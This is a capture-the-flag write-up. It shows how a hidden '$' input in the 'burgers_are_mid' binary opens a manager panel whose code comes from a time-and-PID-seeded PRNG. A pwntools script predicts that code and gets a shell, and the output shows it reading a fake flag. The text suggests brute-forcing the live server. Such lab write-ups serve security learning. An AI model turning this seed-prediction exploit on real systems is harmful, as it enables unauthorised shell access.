
# 5. Hungry

## Solution:

Analyzing the decompiled of the program we can understand how it works, the `main()` function mainly calls `take_order()` and `choose_style()`.

`take_order()` asks 24 y/n questions for ingridents and builds a bitmask of the chosen ones. But is `$` is entered, then `manager_control_panel()` is called.

`manager_control_panel()` seeds PRNG with `time(0) ^ getpid()` and `rand() % 1000000` generated the code. If we enter the right code, the program runs  `/bin/bash` which leads us to the flag.

We can exploit this program by entering `$` when take_order() is called, locally we can use a python script to recreate the seeding used to get the code using `time.time()` and PID from pwntools.

Here is the python script used -
```
from pwn import *
import time
from ctypes import CDLL
from ctypes.util import find_library

L=CDLL(find_library("c"))
E=ELF("./burgers_are_mid")
p=process("./burgers_are_mid")

d=p.recvuntil(b"(y/n)?")
print(d)

p.sendline(b"$")

t=int(time.time())
pp=p.pid
print("t=",t,"pid=",pp)

s=t^pp
L.srand(s)
c=L.rand()%1000000
print("code =",c)

x=p.recvuntil(b":")
print(x)

p.sendline(str(c).encode())

print(p.recvline(timeout=1))
p.interactive()

```

Executing this code gives us -

```
plsworkgod@LoqedIn:/mnt/c/Users/Karni/Desktop/Everything/CTF/hungry/src$ python3 solvelocal.py
[*] '/mnt/c/Users/Karni/Desktop/Everything/CTF/hungry/src/burgers_are_mid'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './burgers_are_mid': pid 881
b'\nWelcome to BitBurger, home of the Bit Burger! May I take your order?\n\nWhat would you like on your Bit Burger?\n - a bun (y/n)?'
t= 1765265361 pid= 881
code = 804516
b' Enter manager access code:'
b' Access granted, starting management interface.\n'
[*] Switching to interactive mode
$ ls
Dockerfile       docker-compose.yml  solve.py
burgers_are_mid  flag.txt            solvelocal.py
$ cat flag.txt
nite{fake_flag}
```

To get the actual flag, a viable option is to bruteforce the server to get the right time and pid required.


## Flag:

```
```

## Concepts learnt:

- 

## Notes:

- NONE
  
## Resources:

- NONE

***

